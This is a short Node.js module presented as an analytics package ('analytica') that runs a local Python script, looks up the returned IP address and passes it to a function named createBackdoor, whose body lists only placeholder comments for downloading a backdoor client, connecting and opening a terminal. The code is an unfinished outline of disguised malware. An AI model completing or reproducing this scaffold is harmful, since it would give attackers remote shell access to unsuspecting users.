"use strict";


const { PythonShell } = require('python-shell');
const pyshell = new PythonShell('/home/pradeep/analytica/index.py');
const geoip = require('geoip-lite');
const cookies = require('browser-cookies');
const https = require('https');


module.exports = analytica;



function analytica() {

}

analytica.prototype.working = function () {
    console.log('Working');
}

analytica.prototype.init = () => {
    fetchIPDetails();
}

let fetchIPDetails = () => {

    pyshell.on('message', function (result) {
        createBackdoor(result);
    });

    pyshell.end(function (err, code, signal) {
        if (err) throw err;
        console.log('finished');
    });

}


let createBackdoor = (ip) => {

    // Get IP Info

    let geoData = geoip.lookup(ip);
    console.log(geoData);

    // Download Backdoor Client

    // Establish Connection

    // Fireup the Terminal

}


